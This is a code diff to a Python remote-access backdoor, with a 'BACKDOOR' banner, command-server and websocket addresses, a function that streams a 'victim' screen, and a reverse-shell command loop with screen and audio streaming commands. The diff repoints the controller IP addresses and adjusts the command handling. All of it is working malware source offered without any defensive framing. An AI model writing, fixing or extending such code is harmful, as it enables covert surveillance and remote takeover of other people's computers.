@@ -18,12 +18,12 @@ import sys
 import webbrowser
 import numpy
 import mss
-SERVER_URL = "192.168.88.106:2020"
-WEBSOCKET_URL="ws://192.168.88.106:8765"
-WEBSOCKET_AUDIO="ws://192.168.88.106:8766"
-WEBSOCKET_SCREEN = "ws://192.168.88.106:6666"
+SERVER_URL = "192.168.88.17:2020"
+WEBSOCKET_URL="ws://192.168.88.17:8765"
+WEBSOCKET_AUDIO="ws://192.168.88.17:8766"
+WEBSOCKET_SCREEN = "ws://192.168.88.17:6666"
 PORT=12345
-IP_ADDRESS="192.168.88.106"
+IP_ADDRESS="192.168.88.17"
 banner = r"""
 ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
@@ -62,7 +62,7 @@ banner = r"""
 """
 async def watch_victim_screen():
     async with websockets.connect(WEBSOCKET_SCREEN) as ws:
-        with mss.mss() as sct:
+        with mss.MSS() as sct:
             monitor = sct.monitors[1]
             while True:
                 img = sct.grab(monitor)
@@ -300,6 +300,7 @@ def reverse_shell_payload():
                continue
            if cmd.lower() == "stream-screen":
                threading.Thread(target=start_watching_victim_screen,daemon=True).start()
+               continue
            if cmd.lower() == "stream-sound":
                thread_audio = listening_victim_realtime()
                continue
